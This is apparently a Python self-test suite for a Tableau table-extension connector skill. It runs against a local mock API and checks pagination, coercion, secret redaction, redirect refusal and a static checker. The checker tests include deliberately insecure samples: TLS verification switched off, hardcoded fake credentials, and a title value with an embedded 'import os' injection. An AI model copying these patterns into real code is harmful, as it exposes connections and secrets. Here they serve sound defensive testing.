#!/usr/bin/env python3
"""Self-test for the tableau-table-extension skill. No network, no real keys.

  python3 tests/test_skill.py                                   # in-process TabPy emulation
  python3 tests/test_skill.py --tabpy http://127.0.0.1:9004     # also through a real TabPy /evaluate
                                   [--tabpy-user U]             #   (password: secret tabpy.password)

The --tabpy server must run on THIS machine (it has to reach the loopback mock)
and must have TABLEAU_TABEXT_MOCK_TOKEN=mock-token-123456 in its environment.
Run with the Python that has pandas, requests, simplejson, pyarrow (e.g. TabPy's venv).
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT / "scripts"))
import check_script  # noqa: E402
import run_local  # noqa: E402
import tabext_common as C  # noqa: E402

TOKEN = "mock-token-123456"
os.environ["TABLEAU_TABEXT_MOCK_TOKEN"] = TOKEN
RESULTS = []
STATE = {"hits429": 0}


# ------------------------------------------------------------------ mock API
class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, headers=None):
        raw = json.dumps(body).encode() if not isinstance(body, bytes) else body
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        u = urlparse(self.path)
        q = {k: v[0] for k, v in parse_qs(u.query).items()}
        auth = self.headers.get("Authorization", "")
        if u.path == "/echo-key":   # bad API that echoes the key in its error body
            return self._send(401, {"error": "invalid token %s" % auth.replace("Bearer ", "")})
        if u.path == "/redir-open":  # no auth needed: cross-host redirect for header-only credentials
            return self._send(302, {}, {"Location": "http://localhost:%d/one" % self.server.server_address[1]})
        if auth != "Bearer " + TOKEN:
            return self._send(401, {"error": "no"})
        if u.path == "/pages":       # page-number pagination, 25 records, page size 10
            page = int(q.get("page", 1))
            recs = [{"id": i, "v": str(i * 1.5), "when": 1767225600000 + i * 3600000,
                     "flag": "yes" if i % 2 else "no", "tags": ["a", "b"], "nested": {"x": i}}
                    for i in range((page - 1) * 10 + 1, min(page * 10, 25) + 1)]
            return self._send(200, {"data": recs})
        if u.path == "/cursor":
            c = int(q.get("cursor") or 0)
            recs = [{"id": i} for i in range(c, min(c + 10, 23))]
            nxt = str(c + 10) if c + 10 < 23 else None
            return self._send(200, {"items": recs, "meta": {"next_cursor": nxt}})
        if u.path == "/link":
            p = int(q.get("p", 1))
            hdr = {"Link": '<http://%s/link?p=%d>; rel="next"' % (self.headers["Host"], p + 1)} if p < 3 else {}
            return self._send(200, [{"id": p * 100 + i} for i in range(5)], hdr)
        if u.path == "/flaky":       # 429 twice with Retry-After: 1, then OK
            STATE["hits429"] += 1
            if STATE["hits429"] <= 2:
                return self._send(429, {"error": "slow down"}, {"Retry-After": "1"})
            return self._send(200, {"data": [{"id": 1}]})
        if u.path == "/slow":
            time.sleep(4)
            return self._send(200, {"data": []})
        if u.path == "/lookup":
            return self._send(200, {"id": q.get("id"), "score": len(q.get("id", ""))})
        port = self.server.server_address[1]
        if u.path == "/one":
            return self._send(200, {"data": [{"id": 7}]})
        if u.path == "/redir-same":      # same origin: followed
            return self._send(302, {}, {"Location": "/one"})
        if u.path == "/redir-other":     # another host (localhost != 127.0.0.1): refused with a credential
            return self._send(302, {}, {"Location": "http://localhost:%d/one" % port})
        if u.path == "/nexturl":         # relative next links, 3 pages
            p = int(q.get("p", 1))
            return self._send(200, {"data": [{"id": p}], "next": "/nexturl?p=%d" % (p + 1) if p < 3 else None})
        if u.path == "/nexturl-other":
            return self._send(200, {"data": [{"id": 1}], "next": "http://localhost:%d/one" % port})
        if u.path == "/window":          # one record per day, end_date inclusive
            import datetime as dt
            d, e = dt.date.fromisoformat(q["start_date"]), dt.date.fromisoformat(q["end_date"])
            STATE.setdefault("windows", []).append((q["start_date"], q["end_date"]))
            out = []
            while d <= e:
                out.append({"day": d.isoformat()})
                d += dt.timedelta(days=1)
            return self._send(200, {"data": out})
        if u.path == "/html":
            return self._send(200, b"<html>login page</html>")
        return self._send(404, {"error": "nope"})


def start_mock():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, "http://127.0.0.1:%d" % srv.server_address[1]


# ----------------------------------------------------------------- helpers
def scaffold(**kw):
    import new_connector
    tmp = tempfile.mkdtemp()
    out = os.path.join(tmp, "c.py")
    args = ["--name", "mock", "--out", out]
    for k, v in kw.items():
        args += ["--" + k.replace("_", "-"), str(v)]
    with open(os.devnull, "w") as dn:
        old, sys.stdout = sys.stdout, dn
        try:
            new_connector.main(args)
        finally:
            sys.stdout = old
    return Path(out).read_text()


def fill(script, repl):
    for a, b in repl:
        assert a in script, "fill: %r not in scaffold" % a[:70]
        script = script.replace(a, b)
    return script


def run(script, args=None, timeout=30, via=None):
    if via:
        return run_local.run_tabpy(via["url"], script, args or {}, timeout, via["headers"])
    return run_local.run_inprocess(script, args or {}, timeout)


def case(name, ok, detail=""):
    RESULTS.append((bool(ok), name, str(detail)[:200]))


SCHEMA_PAGES = '''SCHEMA = {
    "id": "integer",
    "v": "real",
    "when": "datetime",
    "flag": "boolean",
    "tags": "string",
    "nested_x": "integer",
}'''
ROW_PAGES = '''    return {
        "id": dig(rec, "id"),
        "v": dig(rec, "v"),
        "when": dig(rec, "when"),
        "flag": dig(rec, "flag"),
        "tags": dig(rec, "tags"),
        "nested_x": dig(rec, "nested.x"),
    }'''
TODO_SCHEMA = '''SCHEMA = {  # output column -> string | integer | real | boolean | date | datetime
    "id": "string",  # TODO(tabext): one entry per output column, in display order
}'''
TODO_ROW = '''    return {
        "id": dig(rec, "id"),  # TODO(tabext): map every SCHEMA column
    }'''


def common(base, endpoint, items):
    return [("# Grain: one row per <TODO(tabext): what one row means>", "# Grain: one row per record"),
            ("ENDPOINT = '/items'  # TODO(tabext): path of the list endpoint", "ENDPOINT = %r" % endpoint),
            ("ITEMS_PATH = 'data'  # TODO(tabext): dotted path to the record list in the JSON body ('' = body is the list)",
             "ITEMS_PATH = %r" % items),
            ("BASE_URL = 'https://api.example.com/v1'", "BASE_URL = %r" % base)]


# -------------------------------------------------------------------- tests
def test_contract_and_coercion(base, via):
    s = scaffold(auth="bearer", pagination="page", page_size=10)
    s = fill(s, common(base, "/pages", "data") + [
        ("body = request_page(ENDPOINT, params=dict(QUERY, page=page, per_page=PAGE_SIZE))  # TODO(tabext): param names",
         "body = request_page(ENDPOINT, params=dict(QUERY, page=page, per_page=PAGE_SIZE))"),
        (TODO_SCHEMA, SCHEMA_PAGES), (TODO_ROW, ROW_PAGES)])
    errs = [f for f in check_script.check(s) if f["level"] == "error"]
    case("page scaffold passes check_script", not errs, errs)
    res, err, _t, _e = run(s, via=via)
    case("page pagination runs", err is None, err)
    if err:
        return
    probs, _w, cols, n = run_local.validate(res, run_local.declared_schema(s))
    case("page pagination: 25 rows across 3 pages", n == 25, n)
    case("contract OK (JSON + Arrow)", not probs, probs)
    case("real coerced from string", res["v"][0] == 1.5, res["v"][:2])
    case("epoch ms -> UTC datetime string", res["when"][0] == "2026-01-01 01:00:00", res["when"][0])
    case("yes/no -> boolean", res["flag"][:2] == [True, False], res["flag"][:2])
    case("list -> JSON string", res["tags"][0] == '["a", "b"]', res["tags"][0])
    case("nested dig", res["nested_x"][3] == 4, res["nested_x"][:4])


def test_cursor_link(base, via):
    s = scaffold(auth="bearer", pagination="cursor", page_size=10)
    s = fill(s, common(base, "/cursor", "items") + [
        ("params = dict(QUERY, limit=PAGE_SIZE)  # TODO(tabext): page-size param name", "params = dict(QUERY, limit=PAGE_SIZE)"),
        ('params["cursor"] = cursor          # TODO(tabext): cursor param name', 'params["cursor"] = cursor'),
        ("NEXT_CURSOR_PATH = 'meta.next_cursor'  # TODO(tabext): where the next cursor lives", "NEXT_CURSOR_PATH = 'meta.next_cursor'"),
        (TODO_SCHEMA, 'SCHEMA = {"id": "integer"}'), (TODO_ROW, '    return {"id": dig(rec, "id")}')])
    res, err, _t, _e = run(s, via=via)
    case("cursor pagination: 23 rows", err is None and len(res["id"]) == 23, err or len(res["id"]))
    s = scaffold(auth="bearer", pagination="link_header", page_size=5)
    s = fill(s, common(base, "/link", "") + [
        (TODO_SCHEMA, 'SCHEMA = {"id": "integer"}'), (TODO_ROW, '    return {"id": dig(rec, "id")}')])
    res, err, _t, _e = run(s, via=via)
    case("Link-header pagination: 15 rows", err is None and len(res["id"]) == 15, err or res)


def minimal(base, endpoint, auth="bearer", extra=()):
    s = scaffold(auth=auth)
    return fill(s, common(base, endpoint, "data") + [
        (TODO_SCHEMA, 'SCHEMA = {"id": "integer"}'), (TODO_ROW, '    return {"id": dig(rec, "id")}')] + list(extra))


def test_errors(base, via):
    STATE["hits429"] = 0
    res, err, t, _e = run(minimal(base, "/flaky"), via=via)
    case("429 + Retry-After retried within budget", err is None and res["id"] == [1] and t >= 2, err or t)
    s = minimal(base, "/echo-key")
    _r, err, _t, _e = run(s, via=via)
    case("401 error is readable", err and "HTTP 401" in err and "credentials" in err, err)
    case("secret echoed by API is redacted", err and TOKEN not in err and "<redacted>" in err, err)
    _r, err, _t, _e = run(minimal(base, "/html"), via=via)
    case("non-JSON body -> readable error", err and "non-JSON" in err, err)
    s = minimal(base, "/slow", extra=[("TIME_BUDGET_S = 25 ", "TIME_BUDGET_S = 2 ")])
    _r, err, t, _e = run(s, via=via)
    case("time budget stops a slow API before TabPy's timeout", err and t < 6 and ("budget" in err or "reach" in err), (err, t))
    s = minimal(base, "/pages", extra=[("get_secret('mock.token')", "get_secret('missing.token')")])
    _r, err, _t, _e = run(s, via=via)
    case("missing secret names the fix", err and "set_secret.py missing.token" in err, err)
    _r, err, _t, _e = run(minimal("http://127.0.0.1:9", "/x"), via=via)
    case("unreachable host -> network hint", err and "could not reach" in err, err)


RT_CONFIG = ("TIME_BUDGET_S=25\nCONNECT_TIMEOUT_S=5\nREAD_TIMEOUT_S=5\nRETRIES=0\nCA_BUNDLE=None\n"
             "CLIENT_CERT=None\nCLIENT_KEY=None\nMAX_ROWS=100\nON_BAD_VALUE='null'\n")


def rt_script(body):
    return RT_CONFIG + C.runtime_block() + body


def test_protections(base, via):
    res, err, _t, _e = run(minimal(base, "/redir-same"), via=via)
    case("same-origin redirect followed", err is None and res["id"] == [7], err or res)
    _r, err, _t, _e = run(minimal(base, "/redir-other"), via=via)
    case("cross-origin redirect refused with a credential", err and "redirected to another host" in err
         and TOKEN not in err, err)
    _r, err, t, _e = run(minimal("http://192.0.2.1", "/x"), via=via)
    case("credential never sent over plain HTTP (non-loopback)", err and "plain HTTP" in err and t < 3, (err, t))
    nx = [(TODO_SCHEMA, 'SCHEMA = {"id": "integer"}'), (TODO_ROW, '    return {"id": dig(rec, "id")}')]
    s = fill(scaffold(auth="bearer", pagination="next_url"), common(base, "/nexturl", "data") + nx)
    res, err, _t, _e = run(s, via=via)
    case("next_url: relative links followed (3 pages)", err is None and res["id"] == [1, 2, 3], err or res)
    s = fill(scaffold(auth="bearer", pagination="next_url"), common(base, "/nexturl-other", "data") + nx)
    _r, err, _t, _e = run(s, via=via)
    case("next_url on another host refused", err and "another host" in err, err)
    STATE["windows"] = []
    s = fill(scaffold(auth="bearer", pagination="date_window"), common(base, "/window", "data") + [
        (TODO_SCHEMA, 'SCHEMA = {"day": "date"}'), (TODO_ROW, '    return {"day": dig(rec, "day")}'),
        ("START_DATE = _dtc.date.today()", "START_DATE = _dtc.date(2026, 1, 1)"),
        ("timedelta(days=7)  # exclusive", "timedelta(days=10)  # exclusive")])
    res, err, _t, _e = run(s, via=via)
    case("date_window covers [start, end) exactly: 10 days, 2 requests, no overlap",
         err is None and res["day"] == ["2026-01-%02d" % d for d in range(1, 11)]
         and STATE["windows"] == [("2026-01-01", "2026-01-07"), ("2026-01-08", "2026-01-10")],
         err or (res, STATE["windows"]))


def test_runtime_edges():
    sec = "p@ss w/rd+1=="
    s = rt_script(
        "s = %r\n_remember_secret(s)\n"
        "msg = 'q=' + _quote_plus(s) + ' u=' + _quote(s, safe='') + ' b=' + _b64.b64encode(s.encode()).decode() + ' raw=' + s\n"
        "return to_tableau([{'a': redact(msg)}, {'a': 'tok ' + s}], {'a': 'string'})\n" % sec)
    res, err, _t, _e = run(s)
    case("redaction covers raw, URL-quoted, quote_plus and base64 forms",
         err is None and res["a"] == ["q=<redacted> u=<redacted> b=<redacted> raw=<redacted>", "tok <redacted>"],
         err or res)
    s = rt_script(
        "rows = [{'d': '2026-01-01T00:00:00+0530'}, {'d': '2026-01-01T00:00:00.5Z'},"
        " {'d': '2026-01-01 12:00:00.1234567+00:00'}, {'d': '1767225600'}, {'d': 1767225600123},"
        " {'d': '2026-01-01T00:00:00-05:00'}]\n"
        "return to_tableau(rows, {'d': 'datetime'})\n")
    res, err, _t, _e = run(s)
    case("datetime parsing: +HHMM, odd fractions, epoch s/ms strings, UTC", err is None and res["d"] == [
        "2025-12-31 18:30:00", "2026-01-01 00:00:00", "2026-01-01 12:00:00", "2026-01-01 00:00:00",
        "2026-01-01 00:00:00", "2026-01-01 05:00:00"], err or res)
    s = rt_script("return to_tableau([{'d': 20260102}, {'d': '2026-01-02T23:30:00-05:00'}], {'d': 'date'})\n")
    res, err, _t, _e = run(s)
    case("date keeps the value's own calendar day; yyyymmdd int", err is None and res["d"] == [
        "2026-01-02", "2026-01-02"], err or res)
    s = rt_script("return to_tableau([{'i': 2**60}, {'i': '9007199254740993'}, {'i': 1e17}, {'i': 2**64},"
                  " {'i': '1,234'}, {'i': 3.0}], {'i': 'integer'})\n")
    res, err, _t, stderr = run(s)
    case("large integers stay exact; inexact/out-of-range -> null + logged", err is None and res["i"] == [
        2 ** 60, 9007199254740993, None, None, 1234, 3] and "could not be coerced" in stderr, err or res)
    s = rt_script("import numpy as np, pandas as pd\n"
                  "return to_tableau([{'x': np.int64(5)}, {'x': pd.NA}, {'x': np.float64('nan')}], {'x': 'integer'})\n")
    res, err, _t, _e = run(s)
    case("numpy ints are not null; pd.NA / NaN are", err is None and res["x"] == [5, None, None], err or res)


def test_detector():
    pos = {
        "plain": 'api_key = "abcdef123456"', "triple": 'token = """abcdefghij123"""',
        "bytes": "password = b'hunter2hunter2'", "auth tuple": 'r = requests.get(u, auth=("me", "s3cr3tPassw0rd"))',
        "HTTPBasicAuth": 'HTTPBasicAuth("me", "s3cr3tPassw0rd")',
        "os.environ": 'os.environ["TABLEAU_TABEXT_X"] = "zzzzzzzzzzzz"',
        "header pair": 'h = {"X-Api-Key": "abcdEFGH1234"}', "Authorization": 'h = {"Authorization": "Bearer abcdEFGH1234zz"}',
        "concat": 'h = "Bearer " + "abcdEFGH1234zz"', "ODBC PWD": 'cs = "DRIVER={x};SERVER=h;UID=u;PWD=Pa55w0rd!;"',
        "JWT": 'x = "eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.abcdefghijk"', "github_pat": 'x = "github_pat_' + "A" * 50 + '"',
        "user:pass@": 'u = "postgresql://user:p/ss:w0rd@db:5432/x"', "query key": 'u = "https://x/api?api_key=abcdef12345"',
        "attribute": 'self.client_secret = "abcdef123456"', "f-string": 'h = {"Authorization": f"Bearer abcdefgh12345678"}',
    }
    neg = {
        "get_secret": 'API_KEY = get_secret("nasa.api_key")', "token URL": 'TOKEN_URL = "https://login.example.com/oauth2/token"',
        "header name": 'API_KEY_HEADER = "X-Api-Key"', "placeholder": 'api_key = "DEMO_KEY"',
        "secret name": 'SECRET_NAME = "acme.token"', "grant type": 'data = {"grant_type": "client_credentials"}',
        "auth from secrets": 'auth=(get_secret("u"), get_secret("p"))', "token param": 'TOKEN_PARAM = "access_token"',
        "SCHEMA": 'SCHEMA = {"token": "string", "secret": "boolean", "password": "string"}',
        "pageToken": 'm = {"pageToken": "nextPageToken"}', "dotted path": 'NEXT_TOKEN = "pagination.next_token"',
        "comment": "# Uses Bearer authentication for everything here",
        "docstring": 'def f():\n    """Send a Bearer authorization header"""\n    return 1',
        "bearer from secret": 'h = {"Authorization": "Bearer " + get_secret("mock.token")}',
        "f-string var": 'h = {"Authorization": f"Bearer {tok}"}',
    }
    missed = [k for k, v in pos.items() if not C.has_credential(v)]
    case("credential detector: %d positive patterns" % len(pos), not missed, missed)
    fp = [k for k, v in neg.items() if C.has_credential(v)]
    case("credential detector: %d near-misses not flagged" % len(neg), not fp, fp)


def test_static():
    def errs(src):
        return {f["rule"] for f in check_script.check(src) if f["level"] == "error"}
    bad = {
        "TE-NAME": "return {'a': [undefined_thing]}\n",
        "TE-PYVER (parenthesized with)": "with (open('a') as f, open('b') as g):\n    pass\nreturn {'a': [1]}\n",
        "TE-PYVER (X | Y annotation)": "def f(x: int | None):\n    return x\nreturn {'a': [1]}\n",
        "TE-TLS (session.verify)": "import requests\ns = requests.Session()\ns.verify = False\nreturn {'a': [1]}\n",
        "TE-TLS (env var)": "import os\nos.environ['CURL_CA_BUNDLE'] = ''\nreturn {'a': [1]}\n",
        "TE-TLS (environ.update)": "import os\nos.environ.update({'PYTHONHTTPSVERIFY': '0'})\nreturn {'a': [1]}\n",
        "TE-TLS (unverified ctx)": "import ssl\nc = ssl._create_unverified_context()\nreturn {'a': [1]}\n",
        "TE-HTTP": "import requests\nk = get_secret('x')\nr = requests.get('http://api.example.com/x', headers={'k': k}, timeout=5)\n"
                   "return {'a': [1]}\n",
    }
    for label, src in bad.items():
        rule = label.split()[0]
        got = errs(src)
        case("checker flags %s" % label, rule in got, got)
    got = errs("import requests\nr = requests.get('http://127.0.0.1:8080/x', timeout=5)\nreturn {'a': [1]}\n")
    case("checker allows loopback http", "TE-HTTP" not in got, got)
    import io
    import new_connector
    for opt, val in [("title", "Acme\nimport os"), ("base-url", "https://api.example.com/v1?key=abc"),
                     ("endpoint", "items"), ("base-url", "https://u:p@api.example.com")]:
        old, sys.stderr = sys.stderr, io.StringIO()
        try:
            new_connector.main(["--name", "x", "--out", os.path.join(tempfile.mkdtemp(), "x.py"), "--" + opt, val])
            ok = False
        except SystemExit as e:
            ok = e.code not in (0, None)
        finally:
            sys.stderr = old
        case("new_connector rejects --%s %r" % (opt, val.replace("\n", "\\n")[:30]), ok)


def test_collision():
    import xml.etree.ElementTree as ET
    import patch_workbook
    x = ET.fromstring("""<workbook><datasources><datasource name='federated.1'>
      <connection class='federated'><metadata-records>
        <metadata-record class='column'><remote-name>id</remote-name><local-name>[id]</local-name><parent-name>[Input]</parent-name></metadata-record>
        <metadata-record class='column'><remote-name>region</remote-name><local-name>[region]</local-name><parent-name>[Input]</parent-name></metadata-record>
        <metadata-record class='column'><remote-name>id</remote-name><local-name>[id (Table Extension 1)]</local-name><parent-name>[Ext]</parent-name></metadata-record>
      </metadata-records></connection>
      <column datatype='string' name='[id (Table Extension 1)]' role='dimension' type='nominal' />
      <object caption='Table Extension 1' id='Ext'><properties><analytics-extension-object-node>
        <output><relation name='Ext' /></output></analytics-extension-object-node></properties></object>
    </datasource></datasources>
    <worksheets><worksheet name='S1'><x f='[federated.1].[none:id (Table Extension 1):nk]' /></worksheet></worksheets></workbook>""")
    ds = x.find(".//datasource")
    node = ds.find(".//analytics-extension-object-node")
    log = []
    patch_workbook.apply_schema(ds, node, [{"name": "id", "type": "integer"}, {"name": "region", "type": "date"}],
                                x, log, "Table Extension 1")
    recs = {(m.findtext("parent-name"), m.findtext("remote-name")): m.findtext("local-name")
            for m in ds.iter("metadata-record")}
    case("schema keeps the extension's disambiguated local-name", recs.get(("[Ext]", "id")) == "[id (Table Extension 1)]", recs)
    case("new colliding column gets a unique local-name", recs.get(("[Ext]", "region")) == "[region (Table Extension 1)]", recs)
    case("input-table columns untouched", recs.get(("[Input]", "id")) == "[id]" and recs.get(("[Input]", "region")) == "[region]", recs)
    col = {c.get("name"): c.get("datatype") for c in ds.findall("column")}
    case("extension column retyped by local-name", col.get("[id (Table Extension 1)]") == "integer"
         and col.get("[region (Table Extension 1)]") == "date" and "[id]" not in col, col)


def test_input_table(base, via):
    s = scaffold(auth="bearer", input_key="id")
    s = fill(s, common(base, "/lookup", "") + [
        (TODO_SCHEMA, 'SCHEMA = {"id": "string", "score": "integer", "region": "string"}'),
        ('''    return {
        "id": dig(rec, "id"),  # TODO(tabext): map every SCHEMA column
    }''', '''    return {"id": dig(rec, "id"), "score": dig(rec, "score"), "region": inp.get("region")}'''),
        ("for rec in fetch_for(key):  # TODO(tabext): write fetch_for(key)", "for rec in fetch_for(key):"),
        ("\ndef rows():", "\ndef fetch_for(key):\n    return [request_page(ENDPOINT, params={\"id\": key})]\n\n\ndef rows():")])
    errs = [f for f in check_script.check(s, uses_input=True) if f["level"] == "error"]
    case("input-table scaffold passes check", not errs, errs)
    arg = {"_arg1": {"id": ["a", "bb", "bb", "ccc"], "region": ["N", "S", "S", "E"]}}
    res, err, _t, _e = run(s, arg, via=via)
    case("input table (dict of lists) drives lookups, dedup", err is None and res["score"] == [1, 2, 3], err or res)
    if not via:
        import pandas as pd
        res, err, _t, _e = run(s, {"_arg1": pd.DataFrame(arg["_arg1"])})
        case("input table as DataFrame (Arrow path)", err is None and res["region"] == ["N", "S", "E"], err or res)
        res, err, _t, _e = run(s, {})
        case("no input table -> empty result, no NameError", err is None and res["id"] == [], err or res)


def test_validator():
    import datetime
    import numpy as np
    import pandas as pd
    p, _w, _c, _n = run_local.validate({"a": [pd.Timestamp("2026-01-01")]})
    case("validator rejects pandas Timestamp", p and "serialize" in p[0], p)
    p, _w, _c, _n = run_local.validate({"a": [np.int64(1)]})
    case("validator rejects numpy int64", bool(p), p)
    p, _w, _c, _n = run_local.validate({"a": [1, "x"]})
    case("validator rejects mixed-type column", any("mix" in x or "Arrow" in x for x in p), p)
    p, _w, _c, _n = run_local.validate({"a": [1, 2], "b": [1]})
    case("validator rejects unequal lengths", any("lengths" in x for x in p), p)
    p, _w, _c, _n = run_local.validate(None)
    case("validator rejects None", bool(p), p)
    p, w, _c, _n = run_local.validate({"a": [1.0, float("nan")], "b": [None, None]})
    case("NaN ok; all-null column warned", not p and any("entirely null" in x for x in w), (p, w))
    p, _w, _c, _n = run_local.validate({"A": [1], "a": [2]})
    case("case-colliding columns rejected", any("collide" in x for x in p), p)
    # runtime coercion of awkward python values
    rt = C.runtime_block()
    s = ("TIME_BUDGET_S=25\nCONNECT_TIMEOUT_S=5\nREAD_TIMEOUT_S=5\nRETRIES=0\nCA_BUNDLE=None\nCLIENT_CERT=None\n"
         "CLIENT_KEY=None\nMAX_ROWS=100\nON_BAD_VALUE='null'\n" + rt +
         "import numpy as np, pandas as pd, decimal, datetime\n"
         "rows=[{'i':np.int64(3),'r':decimal.Decimal('1.25'),'b':np.bool_(True),'d':pd.Timestamp('2026-03-04T05:06:07Z'),"
         "'dd':datetime.date(2026,1,2),'s':{'k':1},'bad':'abc','tz':'2026-01-01T00:00:00-05:00'},"
         "{'i':None,'r':float('nan'),'b':'0','d':pd.NaT,'dd':'2026-02-03','s':None,'bad':'2','tz':None}]\n"
         "return to_tableau(rows, {'i':'integer','r':'real','b':'boolean','d':'datetime','dd':'date','s':'string','bad':'integer','tz':'datetime'})\n")
    res, err, _t, stderr = run(s)
    case("runtime coerces numpy/Decimal/Timestamp/NaT/date", err is None and res == {
        "i": [3, None], "r": [1.25, None], "b": [True, False], "d": ["2026-03-04 05:06:07", None],
        "dd": ["2026-01-02", "2026-02-03"], "s": ['{"k": 1}', None], "bad": [None, 2],
        "tz": ["2026-01-01 05:00:00", None]}, err or res)
    case("bad values logged to stderr, not raised", "could not be coerced" in stderr, stderr)
    p, _w, _c, _n = run_local.validate(res)
    case("coerced output passes contract", not p, p)


def test_checker():
    bad = {
        "TE-TABS": "x = 1\nif x:\n\ty = 2\nreturn {'a': [1]}\n",
        "TE-COMPILE": "from __future__ import annotations\nreturn {'a': [1]}\n",
        "TE-RETURN": "x = {'a': [1]}\n",
        "TE-YIELD": "yield 1\nreturn {'a': [1]}\n",
        "TE-SECRET": "api_key = 'abcd1234efgh5678'\nreturn {'a': [1]}\n",
        "TE-TIMEOUT": "import requests\nr = requests.get('https://x')\nreturn {'a': [1]}\n",
        "TE-TLS": "import requests\nr = requests.get('https://x', timeout=5, verify=False)\nreturn {'a': [1]}\n",
        "TE-EXIT": "import sys\nsys.exit(1)\nreturn {'a': [1]}\n",
        "TE-MAIN": "if __name__ == '__main__':\n    pass\nreturn {'a': [1]}\n",
        "TE-ORIENT": "import pandas as pd\nreturn pd.DataFrame().to_dict(orient='records')\n",
        "TE-LINESEP": "s = 'a\u2028b'\nreturn {'a': [1]}\n",
    }
    for rule, src in bad.items():
        rules = {f["rule"] for f in check_script.check(src) if f["level"] == "error"}
        case("checker flags %s" % rule, rule in rules, rules)
    w = {f["rule"] for f in check_script.check("return {'a': [len(_arg1)]}\n")}
    case("checker warns on bare _arg1", "TE-ARG1" in w, w)
    rt = C.runtime_block()
    unmarked = rt.replace(C.RUNTIME_BEGIN, "# runtime (markers removed for this scan)")   # no exemption
    case("runtime block itself has no credential literal", not C.has_credential(unmarked))
    s = scaffold(auth="basic").replace(rt.strip(), rt.strip().replace("_T0 = _time.monotonic()", "_T0 = 0"))
    r = {f["rule"] for f in check_script.check(s)}
    case("hand-edited runtime detected", "TE-RUNTIME-DRIFT" in r, r)


def test_workbook(base):
    tmp = Path(tempfile.mkdtemp())
    s = minimal(base, "/pages")
    sp = tmp / "c.py"
    sp.write_text(s)
    res, err, _t, _e = run(s)
    _p, _w, cols, n = run_local.validate(res, run_local.declared_schema(s))
    schema = tmp / "schema.json"
    schema.write_text(json.dumps({"ok": True, "rows": n, "columns": cols}))
    py = sys.executable
    pw = str(ROOT / "scripts" / "patch_workbook.py")
    r = subprocess.run([py, pw, "new", "--script", str(sp), "--schema", str(schema), "--caption", "Mock & 'Co'",
                        "--out", str(tmp / "new.twb")], capture_output=True, text=True)
    case("patch new -> workbook", r.returncode == 0, r.stderr or r.stdout)
    wb = C.Workbook(tmp / "new.twb")
    exts = list(C.table_extensions(wb.root))
    case("new workbook has the script verbatim", exts and C.script_of(exts[0][2]).rstrip() == s.rstrip())
    # change schema: add a datetime column, drop nothing
    s2 = s.replace('SCHEMA = {"id": "integer"}', 'SCHEMA = {"id": "integer", "when": "datetime"}').replace(
        '    return {"id": dig(rec, "id")}', '    return {"id": dig(rec, "id"), "when": dig(rec, "when")}')
    (tmp / "c2.py").write_text(s2)
    res, err, _t, _e = run(s2)
    _p, _w, cols2, n2 = run_local.validate(res, run_local.declared_schema(s2))
    (tmp / "schema2.json").write_text(json.dumps({"ok": True, "rows": n2, "columns": cols2}))
    r = subprocess.run([py, pw, "replace", str(tmp / "new.twb"), "--script", str(tmp / "c2.py"), "--schema",
                        str(tmp / "schema2.json"), "--out", str(tmp / "new2.twb")], capture_output=True, text=True)
    case("patch replace with new column", r.returncode == 0 and "1 new" in r.stdout, r.stderr or r.stdout)
    wb2 = C.Workbook(tmp / "new2.twb")
    col = [c for c in wb2.root.iter("column") if c.get("name") == "[when]"]
    case("datetime column typed in workbook", col and col[0].get("datatype") == "datetime", [c.attrib for c in col])
    leaky = tmp / "leaky.py"
    leaky.write_text(s.replace("get_secret('mock.token')", "'abcd1234efgh5678' if True else ''") + "\ntoken = 'abcd1234efgh5678'\n")
    r = subprocess.run([py, pw, "replace", str(tmp / "new.twb"), "--script", str(leaky), "--force",
                        "--out", str(tmp / "leak.twb")], capture_output=True, text=True)
    case("patch refuses a script with a credential, even --force", r.returncode != 0 and not (tmp / "leak.twb").exists(),
         r.stderr[-200:])

def _errs(src, **kw):
    return {f["rule"] for f in check_script.check(src, **kw) if f["level"] == "error"}


def _rules(src, level):
    return {f["rule"] for f in check_script.check(src) if f["level"] == level}


def test_review_fixes(base):
    """Regression tests for the 2026-10 code + security review."""
    import io
    import new_connector
    py, pw = sys.executable, str(ROOT / "scripts" / "patch_workbook.py")
    tmp = Path(tempfile.mkdtemp())
    rt = C.runtime_block()
    key = "Xk29mQ8zzpq1abcdefGHIJ"

    # --- a credential hidden inside the runtime markers is still found -------------
    s = minimal(base, "/pages")
    for label, ver in (("same version", None), ("version label changed", "v1")):
        body = rt.replace("_T0 = _time.monotonic()", "_T0 = _time.monotonic()\nNASA_API_KEY = %r" % key)
        if ver:
            body = body.replace("TABEXT RUNTIME v3", "TABEXT RUNTIME " + ver)
        bad = s.replace(rt.strip(), body.strip())
        case("secret inside runtime markers flagged (%s)" % label, "TE-SECRET" in _errs(bad), _errs(bad))
        f = tmp / ("hidden_%s.py" % (ver or "same"))
        f.write_text(bad)
        out = tmp / ("hidden_%s.twb" % (ver or "same"))
        r = subprocess.run([py, pw, "new", "--script", str(f), "--force", "--out", str(out)],
                           capture_output=True, text=True)
        case("patch refuses hidden runtime secret (%s, --force)" % label,
             r.returncode != 0 and not out.exists(), r.stderr[-200:])
    tls = s.replace(rt.strip(), rt.strip().replace("_T0 = _time.monotonic()",
                                                   "_T0 = _time.monotonic()\n_x = _session\n_x.verify = False"))
    case("TE-TLS applies inside a modified runtime", "TE-TLS" in _errs(tls), _errs(tls))
    edited = s.replace(rt.strip(), rt.strip().replace("_T0 = _time.monotonic()", "_T0 = 0.0 + _time.monotonic()"))
    (tmp / "edited.py").write_text(edited)
    r = subprocess.run([py, pw, "new", "--script", str(tmp / "edited.py"), "--force", "--out", str(tmp / "ed.twb")],
                       capture_output=True, text=True)
    case("patch refuses a hand-edited runtime even with --force", r.returncode != 0 and "edited by hand" in r.stderr,
         r.stderr[-200:])
    case("canonical runtime is still exempt", not C.has_credential(s) and "TE-RUNTIME-DRIFT" not in _errs(s))

